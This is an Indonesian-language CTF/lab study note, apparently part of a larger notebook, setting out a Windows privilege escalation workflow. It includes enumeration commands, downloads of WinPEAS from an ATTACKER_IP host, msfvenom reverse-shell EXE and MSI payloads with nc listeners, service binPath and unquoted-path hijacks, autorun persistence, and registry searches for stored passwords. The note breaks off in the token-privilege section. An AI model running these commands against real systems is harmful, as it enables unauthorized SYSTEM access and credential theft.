---
id: "45"
title: "🪟 45 — Windows Privilege Escalation Workflow"
category: "5. Privilege Escalation"
categoryId: "privesc"
filename: "45_windows_privesc_workflow.md"
refs_out: ["35","36","41","42","43","46"]
refs_in: ["04","05","08","11","12","14b","19","25","26","32","35","36","37","38","42","43","44","46","63"]
---

# 🪟 45 — Windows Privilege Escalation Workflow
## ⚡ FAST START — Baru Dapat Shell Windows?

Lakukan 5 hal ini **PERTAMA** (urutan wajib) sebelum membaca detail lain:

1. **Cek siapa kita**
   ```cmd
   whoami /all
   ```
2. **Cek privilege (ini yang paling penting)**
   ```cmd
   whoami /priv
   ```
3. **Cek OS**
   ```cmd
   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
   ```
4. **Upload dan jalankan WinPEAS**
   *Lihat Section 2.1 untuk cara transfer.*
5. **Baca output merah WinPEAS → pilih vector**
   *Lihat Section 13 Decision Tree.*

### Interpretasi cepat `whoami /priv`

| Output yang terlihat                | Apa artinya                                          | Langkah selanjutnya |
|------------------------------------|------------------------------------------------------|----------------------|
| `SeImpersonatePrivilege   Enabled` | Kemungkinan **GodPotato** atau **Token Impersonation** | → **Bagian 5** |
| `SeAssignPrimaryToken… Enabled`   | Sama seperti di atas                                 | → **Bagian 5** |
| `SeDebugPrivilege   Enabled`       | Bisa gunakan **Mimikatz** atau **Procmon**          | → **Bagian 5.3** |
| `SeBackupPrivilege  Enabled`       | Pertimbangkan **VSS/ShadowCopy** exploit             | → **Bagian 5.4** |
| Tidak ada privilege menarik        | Jalankan **WinPEAS** dulu, temukan hal berwarna merah | → **Jalankan WinPEAS** |

---

> **Tujuan:** Menjadikan Windows Privilege Escalation sebagai proses sistematis yang dapat digunakan berulang kali pada CTF/lab.
> 
> **Target:** Hack The Box, TryHackMe, Proving Grounds, dan lingkungan latihan yang memang diizinkan.
> 
> **Asumsi:** Sudah memperoleh low-privilege shell pada Windows target.
> 
> **Prinsip utama:**
> 
> ```text
> ENUMERATE
>     ↓
> IDENTIFY
>     ↓
> VALIDATE
>     ↓
> EXPLOIT
>     ↓
> VERIFY
>     ↓
> CLEANUP
> ```
> 
> **Tujuan akhir:** mendapatkan `NT AUTHORITY\SYSTEM` atau privilege Administrator yang dibutuhkan oleh lab.

---

# 🧭 BAGIAN 0 — FONDASI WINDOWS PRIVILEGE ESCALATION

## 0.1 🧠 Windows vs Linux PrivEsc Mindset

Pada Linux, kita sering mencari:

```text
sudo
SUID
Capabilities
Cron
Writable files
PATH hijacking
```

Pada Windows, prinsipnya sama:

```text
Apa yang dipercaya sistem sebagai privileged?
        ↓
Apa yang dapat kita kontrol?
        ↓
Di mana trust boundary-nya rusak?
```

Tetapi implementation detail-nya berbeda.

### 🏠 Analogi

Bayangkan rumah:

```text
Low-priv user
    ↓
sudah berhasil masuk rumah
    ↓
cari kunci cadangan
    ↓
cari ruangan maintenance
    ↓
cari service yang membuka pintu
    ↓
cari kartu akses yang memiliki privilege lebih tinggi
```

Dalam Windows:

```text
"Kunci cadangan"
    = credential / password / token

"Ruangan maintenance"
    = service configuration

"Kartu akses"
    = access token

"Izin khusus"
    = token privileges

"Pintu otomatis"
    = scheduled task / autorun

"Laci berisi konfigurasi"
    = registry
```

---

## 0.2 🆚 Perbedaan Utama Windows vs Linux

|Linux|Windows|
|---|---|
|`/etc/passwd`|Registry + SAM|
|`/etc/sudoers`|Service ACL / token / policy|
|SUID|Token privileges / service context|
|Cron|Scheduled Tasks|
|systemd|Windows Services|
|`/etc/shadow`|SAM / LSA secrets|
|`chmod`|NTFS ACL|
|`PATH`|PATH / DLL search behavior|
|root|SYSTEM|
|`/proc`|Windows process/token APIs|

### Attack surface Windows yang wajib diperhatikan

```text
REGISTRY
SERVICES
ACCESS TOKENS
TOKEN PRIVILEGES
UAC
NTFS ACL
SCHEDULED TASKS
DLL SEARCH
CREDENTIAL STORAGE
PATCH LEVEL
DOMAIN MEMBERSHIP
```

---

# 0.3 🏰 Windows Privilege Hierarchy

```text
                 NT AUTHORITY\SYSTEM
                         │
                         │
                         ▼
              Built-in Administrator
                         │
                         │
                         ▼
             Local Administrator
                         │
                         │
                         ▼
                 Standard User
                         │
                         │
                         ▼
              Guest / Restricted
```

### ⚠️ Hal penting

Jangan menyederhanakan:

```text
Administrator = SYSTEM
```

Menjadi:

```text
Administrator ≡ SYSTEM
```

Itu tidak selalu benar.

Administrator adalah account dengan administrative privileges, sedangkan:

```text
NT AUTHORITY\SYSTEM
```

adalah built-in service/security principal dengan privilege yang sangat tinggi.

### Target umum CTF

```text
LOW PRIV USER
      ↓
ADMIN
      ↓
SYSTEM
```

Namun beberapa challenge hanya memerlukan:

```text
LOW PRIV
   ↓
Administrator
```

---

# 0.4 🔐 Access Token, Privilege, UAC, Integrity

## Access Token

Analoginya:

> Access Token = kartu identitas yang dibawa process.

Token mengandung informasi seperti:

```text
User SID
Group SIDs
Privileges
Integrity Level
Token type
```

---

## Token Privilege

Analoginya:

> Token privilege = izin khusus yang tercetak di kartu.

Contoh:

```text
SeImpersonatePrivilege
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
```

---

## UAC

Analoginya:

> UAC = satpam yang meminta konfirmasi sebelum proses privileged dijalankan.

UAC terutama relevan untuk administrative users yang memiliki split-token model.

Jadi:

```text
Administrator group
      ≠
selalu elevated token
```

---

## Integrity Level

Secara sederhana:

```text
Low
Medium
High
System
```

Contoh:

```text
Standard user interactive process
        ↓
Medium Integrity
```

Administrative elevated process:

```text
Administrator
        ↓
High Integrity
```

SYSTEM:

```text
SYSTEM
  ↓
System Integrity
```

---

## SeImpersonatePrivilege

Konsep sederhananya:

> Process diberi kemampuan tertentu untuk bertindak menggunakan security context token yang diperolehnya melalui impersonation.

Privilege ini sangat menarik karena historically dapat menjadi jalur privilege escalation pada service/web contexts.

Namun:

```text
SeImpersonatePrivilege ditemukan
        ≠
SYSTEM otomatis
```

Kita tetap harus:

```text
confirm privilege
+
identify compatible technique
+
check OS/environment
+
validate result
```

---

## Mandatory Integrity Control

MIC membantu membatasi interaksi antar integrity level.

Secara konseptual:

```text
Low
  ↓
Medium
  ↓
High
  ↓
System
```

Proses dari level lebih rendah tidak bebas melakukan operasi terhadap level lebih tinggi.

---

# 0.5 ✅ Windows Shell → Langkah Pertama

Begitu mendapatkan shell:

```text
[ ] whoami
[ ] whoami /all
[ ] whoami /priv
[ ] whoami /groups
[ ] hostname
[ ] systeminfo
[ ] net user %USERNAME%
[ ] net localgroup administrators
[ ] ipconfig /all
[ ] tasklist
[ ] sc query
[ ] schtasks /query
```

Setelah itu:

```text
[ ] Automated enumeration
[ ] Manual verification
[ ] Pick strongest vector
[ ] Exploit
[ ] Verify
```

---

# 🖥️ BAGIAN 1 — INITIAL ENUMERATION WINDOWS

# 1.1 🔎 System & OS Information

```powershell
# Identifikasi user saat ini
whoami

# Tampilkan account, groups, privileges, integrity, dan SID
whoami /all

# Tampilkan privilege token
whoami /priv

# Tampilkan group membership
whoami /groups
```

Contoh:

```text
C:\Users\webuser>whoami
corp\webuser
```

Kemudian:

```text
C:\Users\webuser>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                State
============================= ========
SeChangeNotifyPrivilege       Enabled
SeImpersonatePrivilege        Enabled
SeCreateGlobalPrivilege       Enabled
```

Temuan:

```text
SeImpersonatePrivilege
```

langsung masuk kandidat prioritas tinggi.

---

## OS information

```powershell
# Informasi OS, build, architecture, hotfix dan system configuration
systeminfo

# Ringkas informasi OS
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Contoh:

```text
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
```

Perhatikan:

```text
OS Name
OS Version
Build
Architecture
```

---

# 1.2 🩹 Patch / Hotfix

Legacy:

```cmd
REM Tampilkan hotfix
wmic qfe list brief
```

PowerShell:

```powershell
# Tampilkan installed hotfix
Get-HotFix |
    Sort-Object InstalledOn -Descending
```

Contoh:

```text
HotFixID    InstalledOn
---------   -----------
KB5035849   3/12/2024
KB5034763   2/13/2024
KB5034204   1/30/2024
```

Jangan menyimpulkan:

```text
hotfix lama
↓
vulnerable
```

secara otomatis.

Yang benar:

```text
OS build
+
patch state
+
vulnerability affected range
+
architecture
+
mitigation
=
exploitability
```

---

# 1.3 🌐 Hostname & Domain

```powershell
# Hostname
hostname

# Computer name
echo $env:COMPUTERNAME

# Domain
echo $env:USERDOMAIN

# DNS domain
echo $env:USERDNSDOMAIN
```

Dengan CMD:

```cmd
REM Hostname
echo %COMPUTERNAME%

REM User domain
echo %USERDOMAIN%

REM DNS domain
echo %USERDNSDOMAIN%
```

Contoh:

```text
COMPUTERNAME = WEB01
USERDOMAIN   = CORP
USERDNSDOMAIN = corp.local
```

Berarti:

```text
Domain joined
     ↓
AD attack surface mungkin relevan
```

---

# 1.4 👥 User & Group Enumeration

```cmd
REM Tampilkan local users
net user
```

```powershell
# Tampilkan local users
Get-LocalUser
```

Detail:

```cmd
REM Detail user
net user USERNAME
```

PowerShell:

```powershell
# Detail user tertentu
Get-LocalUser -Name "USERNAME"
```

---

## Local Groups

```cmd
REM Semua local groups
net localgroup
```

```powershell
# Semua local groups
Get-LocalGroup
```

---

## Administrators group

```cmd
REM Lihat member Administrators
net localgroup administrators
```

```powershell
# Lihat anggota Administrators
Get-LocalGroupMember -Group "Administrators"
```

Temuan seperti:

```text
Administrator
webuser
svc_backup
```

harus dikorelasikan dengan:

```text
Apakah current user salah satunya?
Apakah user bisa menambahkan dirinya?
Apakah nested group memberi administrative rights?
```

---

# 1.5 🌐 Domain Enumeration

Jika domain joined:

```cmd
REM Domain users
net user /domain

REM Domain groups
net group /domain
```

Perlu diingat:

```text
Local users/groups
        ≠
Domain users/groups
```

---

# 1.6 🌍 Network Information

```cmd
REM Network configuration
ipconfig /all

REM Routing table
route print

REM Active connections
netstat -ano

REM Listening sockets
netstat -ano | findstr LISTENING

REM Established connections
netstat -ano | findstr ESTABLISHED

REM ARP cache
arp -a

REM Windows hosts file
type C:\Windows\System32\drivers\etc\hosts

REM DNS cache
ipconfig /displaydns
```

### PowerShell

```powershell
# Network configuration
Get-NetIPConfiguration

# Active TCP connections
Get-NetTCPConnection

# Listening ports
Get-NetTCPConnection -State Listen
```

---

## 🎯 Apa yang dicari?

```text
127.0.0.1:8080
127.0.0.1:3306
127.0.0.1:5985
127.0.0.1:1433
```

Contoh:

```text
TCP    127.0.0.1:8080    0.0.0.0:0    LISTENING    4120
```

PID:

```text
4120
```

Hubungkan:

```powershell
# Cari process berdasarkan PID
Get-Process -Id 4120
```

---

# ⚙️ 1.7 Running Processes

```cmd
REM Semua process
tasklist

REM Verbose
tasklist /v

REM Process tertentu
tasklist /fi "imagename eq powershell.exe"
```

PowerShell:

```powershell
# Semua process
Get-Process
```

---

## Process yang berjalan sebagai SYSTEM

```cmd
REM Cari process SYSTEM
tasklist /v | findstr /i "SYSTEM"
```

Lebih baik:

```powershell
# Cari process dengan owner bila informasi tersedia
Get-CimInstance Win32_Process |
    Select-Object ProcessId, Name, CommandLine
```

---

# 1.8 ⚙️ Windows Services

```cmd
REM Semua services
sc query

REM Semua service type
sc query type= all
```

PowerShell:

```powershell
# Semua services
Get-Service

# Running services
Get-Service |
    Where-Object {$_.Status -eq "Running"}
```

---

## Service metadata

```cmd
REM Service name, path, start mode, account
wmic service get name,pathname,startmode,startname
```

Alternatif:

```powershell
# Detail Windows services
Get-CimInstance Win32_Service |
    Select-Object Name, PathName, StartName, StartMode
```

Contoh:

```text
Name       : VulnSvc
PathName   : C:\Program Files\Vulnerable App\service.exe
StartName  : LocalSystem
StartMode  : Auto
```

Ini kandidat menarik.

---

# 1.9 📦 Installed Software

```cmd
REM Registry uninstall entries
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

REM 32-bit software on 64-bit Windows
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s
```

PowerShell:

```powershell
# Installed applications
Get-ItemProperty `
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher |
    Sort-Object DisplayName
```

Legacy:

```cmd
REM WMIC product query
wmic product get name,version,vendor
```

### ⚠️ Catatan

`wmic product` dapat lambat dan dapat trigger Windows Installer operations pada beberapa environment.

Untuk enumeration umum, registry lebih praktis.

---

## Program directories

```cmd
REM Program Files
dir "C:\Program Files"

REM Program Files x86
dir "C:\Program Files (x86)"
```

Cari software:

```text
backup software
database
custom agent
old runtime
third-party service
security software
```

---

# ⏰ 1.10 Scheduled Tasks

```cmd
REM Semua scheduled task
schtasks /query /fo LIST /v
```

PowerShell:

```powershell
# Semua scheduled tasks
Get-ScheduledTask
```

Task yang aktif:

```powershell
# Task yang tidak disabled
Get-ScheduledTask |
    Where-Object {$_.State -ne "Disabled"}
```

Detail:

```cmd
REM Detail task tertentu
schtasks /query /tn "TASKNAME" /fo LIST /v
```

Perhatikan:

```text
Task To Run
Run As User
Schedule
Author
Working Directory
```

Target penting:

```text
SYSTEM
Administrator
service account
```

---

# 🚀 1.11 Startup Applications

## Registry autorun

```cmd
REM HKLM Run
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

REM HKCU Run
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

REM HKLM RunOnce
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

REM HKCU RunOnce
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
```

---

## Startup folder

```cmd
REM System-wide startup
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

REM Current user startup
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

PowerShell:

```powershell
# Enumerate startup commands
Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User
```

### Pertanyaan penting

```text
Siapa yang menjalankan?
        ↓
Apa yang dijalankan?
        ↓
Apakah file dapat ditulis?
        ↓
Apakah process privileged?
```

---

# 📂 1.12 File System Enumeration

```cmd
REM Cari file yang memiliki nama menarik
dir /s /b *password* *cred* *config* *secret* 2>nul

REM Cari extension menarik
dir /s /b *.txt *.xml *.ini *.config *.ps1 *.bat *.cmd 2>nul

REM Sensitive directories
dir C:\Users\
dir C:\Backup\ 2>nul
dir C:\Temp\ 2>nul
dir C:\Windows\Temp\ 2>nul
```

PowerShell:

```powershell
# Cari file berdasarkan nama
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Name -match 'password|cred|secret|config'
    } |
    Select-Object FullName
```

---

# 1.13 ✏️ File Permissions

Windows menggunakan NTFS ACL.

Tool yang sangat berguna:

```text
accesschk.exe
```

Contoh:

```cmd
REM Cek akses write terhadap file/directory
accesschk.exe -uwqs "%USERNAME%" C:\ 2>nul
```

Untuk file tertentu:

```cmd
REM Detail ACL file
icacls "C:\Path\To\File.exe"
```

Contoh:

```text
BUILTIN\Users:(M)
```

`M`:

```text
Modify
```

Temuan:

```text
SYSTEM executes file
+
Users can Modify file
=
strong candidate
```

---

# 🤖 BAGIAN 2 — AUTOMATED ENUMERATION TOOLS

# 2.1 🟢 WinPEAS — Primary Tool

WinPEAS membantu mengotomatisasi banyak pemeriksaan:

```text
System
Users
Groups
Services
Scheduled Tasks
Registry
Credentials
PATH
DLL
AlwaysInstallElevated
Unquoted paths
Applications
Defender
Security products
```

Tetapi:

```text
WinPEAS finding
      ≠
confirmed exploit
```

Selalu lakukan manual validation.

---

# 2.1.1 📦 Transfer WinPEAS dari Parrot

Di Parrot:

```bash
# Masuk ke directory tools
cd /opt/winpeas

# Jalankan HTTP server
python3 -m http.server 8080
```

Windows:

```cmd
REM Download menggunakan certutil
certutil -urlcache -split -f http://ATTACKER_IP:8080/winPEASx64.exe winpeas.exe
```

---

## PowerShell download

```powershell
# Download executable menggunakan Invoke-WebRequest
Invoke-WebRequest `
    -Uri "http://ATTACKER_IP:8080/winPEASx64.exe" `
    -OutFile ".\winpeas.exe"
```

Alternatif:

```powershell
# Download menggunakan WebClient
(New-Object Net.WebClient).DownloadFile(
    "http://ATTACKER_IP:8080/winPEASx64.exe",
    ".\winpeas.exe"
)
```

---

# 2.1.2 ▶️ Jalankan

```cmd
REM Jalankan WinPEAS
.\winpeas.exe
```

Simpan output:

```cmd
REM Redirect output
.\winpeas.exe > winpeas_output.txt
```

Dengan output sekaligus:

```cmd
REM Tampilkan dan simpan output
.\winpeas.exe > winpeas_output.txt
type winpeas_output.txt
```

---

# 2.1.3 🎨 Cara Membaca WinPEAS

Warna sebaiknya dipahami sebagai:

```text
indikator prioritas
```

bukan:

```text
bukti exploit
```

Model berpikir:

```text
RED
 ↓
Interesting
 ↓
Manual verification
 ↓
Is it exploitable?
 ↓
Exploit
```

---

# 2.1.4 📊 Section WinPEAS Penting

|Section|Cari|Vector|
|---|---|---|
|System Information|OS/build|Kernel/Patch|
|Users Information|current identity|Account abuse|
|Groups Information|Administrators/groups|Privilege|
|Token Information|privileges|Token abuse|
|Services|paths/permissions|Service abuse|
|Modifiable Services|writable config|Service hijack|
|Unquoted Service Paths|spaces + unquoted path|Service abuse|
|DLL Hijacking|missing DLL / writable path|DLL hijack|
|Scheduled Tasks|privileged execution|Task hijack|
|Registry|dangerous keys|Registry abuse|
|AlwaysInstallElevated|MSI policy|SYSTEM execution|
|AutoLogon|stored credentials|Credential reuse|
|Password Files|plaintext credentials|Cred reuse|
|PowerShell History|commands/passwords|Credential reuse|
|PATH|writable directories|PATH hijacking|
|Installed Apps|vulnerable software|Local exploit|
|Security Products|Defender/AV|Tooling constraints|
|Network|localhost services|Local service attack|
|Named Pipes|privileged IPC|Token/service abuse|
|Browsers|stored credentials|Credential access|

---

# 2.2 🪑 Seatbelt

Seatbelt fokus pada Windows security enumeration.

```cmd
REM Jalankan seluruh group check
.\Seatbelt.exe -group=all
```

Spesifik:

```cmd
REM Token privileges
.\Seatbelt.exe TokenPrivileges

REM Credential Manager
.\Seatbelt.exe CredentialManager

REM PowerShell history
.\Seatbelt.exe PowerShellHistory

REM Browser presence
.\Seatbelt.exe ChromiumPresence

REM Processes
.\Seatbelt.exe Processes

REM Defender
.\Seatbelt.exe WindowsDefender
```

---

# 2.3 🧪 PowerUp

Import:

```powershell
# Izinkan script untuk lab lalu import PowerUp
Set-ExecutionPolicy -Scope Process Bypass
. .\PowerUp.ps1
```

Run:

```powershell
# Jalankan seluruh PowerUp checks
Invoke-AllChecks
```

Service:

```powershell
# Cari unquoted service paths
Get-ServiceUnquoted

# Cari writable service executable
Get-ModifiableServiceFile

# Cari service yang dapat dimodifikasi
Get-ModifiableService
```

Registry:

```powershell
# AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated

# AutoLogon
Get-RegistryAutoLogon
```

DLL:

```powershell
# DLL hijacking candidates
Find-ProcessDLLHijack
Find-PathDLLHijack
```

---

# 2.4 🔍 PrivescCheck

```powershell
# Import dan jalankan basic checks
Set-ExecutionPolicy -Scope Process Bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

Extended:

```powershell
# Extended enumeration
Invoke-PrivescCheck -Extended
```

Report:

```powershell
# Generate reports jika versi script mendukung option tersebut
Invoke-PrivescCheck -Report PrivescReport
```

---

# 2.5 🩹 Watson

Watson digunakan untuk membantu mengidentifikasi patch/vulnerability candidates.

```cmd
REM Jalankan Watson
.\Watson.exe
```

Konsep:

```text
Build
+
Patch state
+
Known CVE
=
Candidate
```

Bukan:

```text
Watson menemukan CVE
=
langsung exploitable
```

---

# 🛠️ BAGIAN 3 — SERVICE EXPLOITATION

# 3.1 🔎 Unquoted Service Path

Misalnya service:

```text
C:\Program Files\Vulnerable Service\service.exe
```

tetapi ditulis tanpa quotation:

```text
C:\Program Files\Vulnerable Service\service.exe
```

Windows harus menentukan executable path.

Secara konsep, path ambigu seperti ini dapat membuat intermediate executable paths relevan, misalnya:

```text
C:\Program.exe
C:\Program Files\Vulnerable.exe
C:\Program Files\Vulnerable Service\service.exe
```

Namun:

> **Unquoted service path saja tidak cukup.**

Harus ada kombinasi:

```text
Unquoted path
+
space
+
writable candidate directory
+
privileged service account
+
ability to trigger service
```

---

# 3.1.1 🔍 Identifikasi

```cmd
REM Cari service path yang tidak dimulai dari Windows directory
wmic service get name,pathname,startmode,startname |
    findstr /i /v "C:\Windows\\"

REM Cari path yang mengandung spasi
wmic service get name,pathname,startmode,startname |
    findstr /i " "
```

PowerShell:

```powershell
# Cari service path yang mengandung spasi dan tidak di-quote
Get-CimInstance Win32_Service |
    Where-Object {
        $_.PathName -match ' ' -and
        $_.PathName -notmatch '^".*"$'
    } |
    Select-Object Name, PathName, StartName, StartMode
```

---

# 3.1.2 ✏️ Cek Write Permission

```cmd
REM Cek ACL directory
icacls "C:\Program Files\Vulnerable Service\"
```

Dengan AccessChk:

```cmd
REM Periksa permission directory
accesschk.exe -dqv "C:\Program Files\Vulnerable Service\"
```

Cari:

```text
Users:(W)
Users:(M)
Authenticated Users:(M)
Everyone:(M)
```

---

# 3.1.3 💥 Eksploitasi

Misalnya service mencari:

```text
C:\Program Files\Vulnerable.exe
```

dan:

```text
C:\Program Files\
```

dapat ditulis.

Payload dapat ditempatkan pada candidate path:

```text
C:\Program Files\Vulnerable.exe
```

Contoh payload lab:

```bash
# Di Parrot: buat Windows reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$ATTACKER_IP \
  LPORT=4444 \
  -f exe \
  -o Vulnerable.exe
```

Transfer:

```cmd
REM Transfer executable ke target sesuai path yang writable
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"
```

Listener:

```bash
# Di Parrot: listener
nc -lvnp 4444
```

Trigger service:

```cmd
REM Restart service jika current user punya permission
sc stop "VulnSvc"
sc start "VulnSvc"
```

### ⚠️ Kapan tidak bekerja?

```text
[ ] Candidate directory tidak writable
[ ] Service tidak berjalan sebagai privileged account
[ ] Service tidak dapat direstart
[ ] Path ternyata quoted
[ ] Path parsing tidak menghasilkan candidate yang relevan
[ ] AV/EDR memblokir payload
```

---

# 3.2 🔐 Weak Service Permissions

Masalah yang lebih penting daripada sekadar binary writable:

```text
User
 ↓
SERVICE_CHANGE_CONFIG
 ↓
ubah binary path
 ↓
service berjalan sebagai SYSTEM
 ↓
arbitrary command execution
```

---

# 3.2.1 🔎 Identifikasi

```cmd
REM Cek service permission dengan AccessChk
accesschk.exe -uwcqv "%USERNAME%" *
```

Coba principals umum:

```cmd
REM Cek Users
accesschk.exe -uwcqv "Users" *

REM Cek Everyone
accesschk.exe -uwcqv "Everyone" *

REM Cek Authenticated Users
accesschk.exe -uwcqv "Authenticated Users" *
```

Detail:

```cmd
REM Service configuration
sc qc "ServiceName"

REM Security descriptor
sc sdshow "ServiceName"
```

---

### Contoh output `accesschk` untuk Users
```
C:\> accesschk.exe /accepteula -uwcqv "Users" *

RW VulnSvc
  SERVICE_ALL_ACCESS     ← INI SANGAT BAHAYA

Artinya: group "Users" punya full control atas service ini
Action: sc config VulnSvc binPath= "C:\\Temp\\shell.exe"
```


# 3.2.2 🧩 Permission Penting

|Permission|Arti|Potensi|
|---|---|---|
|`SERVICE_ALL_ACCESS`|Full service control|Sangat kuat|
|`SERVICE_CHANGE_CONFIG`|Ubah configuration|Ganti `binPath`|
|`SERVICE_START`|Start service|Trigger|
|`SERVICE_STOP`|Stop service|Restart|
|`WRITE_DAC`|Modify ACL|Grant access|
|`WRITE_OWNER`|Change owner|ACL takeover|

---

# 3.2.3 💥 Service `binPath` Abuse

Jika:

```text
SERVICE_CHANGE_CONFIG
```

dapat dilakukan:

```cmd
REM Ubah service command
sc config "VulnSvc" binPath= "C:\Temp\payload.exe"

REM Trigger
sc stop "VulnSvc"
sc start "VulnSvc"
```

Alternatif command execution sederhana:

```cmd
REM Untuk verifikasi pada lab
sc config "VulnSvc" binPath= "cmd.exe /c whoami > C:\Temp\service-output.txt"

REM Start service
sc start "VulnSvc"

REM Baca hasil
type C:\Temp\service-output.txt
```

Output yang diharapkan:

```text
nt authority\system
```

Ini merupakan validasi sebelum menggunakan payload lebih kompleks.

---

# 3.3 📦 Writable Service Binary

Ambil binary path:

```cmd
REM Cari service path
wmic service get name,pathname,startname |
    findstr /i "VulnSvc"
```

ACL:

```cmd
REM Cek permission binary
icacls "C:\Path\To\service.exe"
```

Jika:

```text
BUILTIN\Users:(M)
```

maka user dapat memodifikasi binary.

---

## Replace

Backup:

```cmd
REM Backup binary asli
copy "C:\Path\To\service.exe" "C:\Temp\service.exe.bak"
```

Replace:

```cmd
REM Replace dengan executable lab
copy "C:\Temp\payload.exe" "C:\Path\To\service.exe"
```

Restart:

```cmd
REM Restart service
sc stop "VulnSvc"
sc start "VulnSvc"
```

---

# 🧩 BAGIAN 4 — REGISTRY EXPLOITATION

# 4.1 ⚠️ AlwaysInstallElevated

Windows Installer policy dapat menjadi privilege escalation vector jika **kedua** policy berikut aktif:

```text
HKLM = 1
HKCU = 1
```

Check:

```cmd
REM HKLM
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

REM HKCU
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

Expected vulnerable configuration:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

pada keduanya.

---

# 4.1.1 💥 MSI Payload

Di Parrot:

```bash
# Buat MSI payload untuk lab
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$ATTACKER_IP \
  LPORT=4444 \
  -f msi \
  -o malicious.msi
```

Listener:

```bash
# Listener
nc -lvnp 4444
```

Target:

```cmd
REM Jalankan MSI
msiexec /quiet /qn /i C:\Temp\malicious.msi
```

### Kenapa bekerja?

```text
Windows Installer
      ↓
policy configuration
      ↓
MSI execution context
      ↓
elevated execution
```

Namun exploitability harus divalidasi terhadap konfigurasi OS yang sebenarnya.

---

# 4.2 🚀 AutoRun Registry Abuse

Cek:

```cmd
REM HKLM autorun
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

REM HKCU autorun
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

REM RunOnce
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
```

Kemudian:

```text
Autorun entry
     ↓
siapa yang menjalankan?
     ↓
apakah file writable?
     ↓
apakah user privileged?
```

---

## HKCU autorun

```cmd
REM Contoh lab: autorun current user
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
  /v "Updater" ^
  /t REG_SZ ^
  /d "C:\Temp\payload.exe" ^
  /f
```

⚠️ Ini menjadi privilege escalation hanya apabila proses yang melakukan autorun memiliki privilege lebih tinggi.

Kalau:

```text
current user = low privilege
autorun = current user
```

hasilnya hanya persistence untuk user tersebut, bukan SYSTEM escalation.

---

# 4.3 🔑 Registry Credential Discovery

Cari kata kunci:

```cmd
REM Cari "password" di HKLM
reg query HKLM /f password /t REG_SZ /s

REM Cari "password" di HKCU
reg query HKCU /f password /t REG_SZ /s

REM Cari passwd
reg query HKLM /f passwd /t REG_SZ /s
reg query HKCU /f passwd /t REG_SZ /s
```

---

## Autologon

```cmd
REM Windows Winlogon configuration
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Cari:

```text
DefaultUserName
DefaultPassword
AutoAdminLogon
```

---

## PuTTY

```cmd
REM PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

---

## VNC

```cmd
REM Check common VNC configuration locations
reg query "HKCU\Software\ORL\WinVNC3" /s
reg query "HKCU\Software\TightVNC\Server" /s
```

---

# 🎟️ BAGIAN 5 — TOKEN PRIVILEGE EXPLOITATION

# 5.1 🔍 `whoami /priv`

```cmd
REM Tampilkan token privileges
whoami /priv
```

Cari:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
SeCreateTokenPrivilege
```

---

# 5.2 🍯 SeImpersonatePrivilege — Potato Family

Ini adalah salah satu vector Windows PrivEsc yang sangat sering muncul pada CTF, khususnya:

```text
IIS
SQL Server
Windows service
web application
service account
```

Tetapi:

> Jangan gunakan aturan “SeImpersonate = 90% pasti root”.

Version, context, token availability, service configuration, security controls, dan technique compatibility semuanya berpengaruh.

---

# 5.2.1 🧠 Potato Family Concept

Model sederhana:

```text
Low-privileged process
        │
        ▼
Has SeImpersonatePrivilege
        │
        ▼
Interact with privileged service / COM / RPC mechanism
        │
        ▼
Obtain or impersonate SYSTEM token
        │
        ▼
SYSTEM process
```

---

# 5.2.2 📊 Potato Comparison

|Tool|Kategori|Kondisi umum|Catatan|
|---|---|---|---|
|JuicyPotato|COM/DCOM|Windows lama|Compatibility sangat penting|
|PrintSpoofer|Named pipe / impersonation|Win10/Server 2019-era scenarios|Memerlukan kondisi spooler/pipe yang sesuai|
|RoguePotato|RPC/NTLM flow|Modern Windows scenarios|Memerlukan network/setup tertentu|
|GodPotato|COM/RPC token abuse|Banyak modern Windows builds|Tetap harus cocok dengan target|
|SweetPotato|Collection/framework|Multiple techniques|Bergantung pada method yang dipilih|

---

# 5.2.3 🧪 Verifikasi Privilege

```cmd
REM Cek privilege
whoami /priv
```

Contoh:

```text
SeImpersonatePrivilege        Enabled
```

Kemudian:

```cmd
REM Cek OS
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

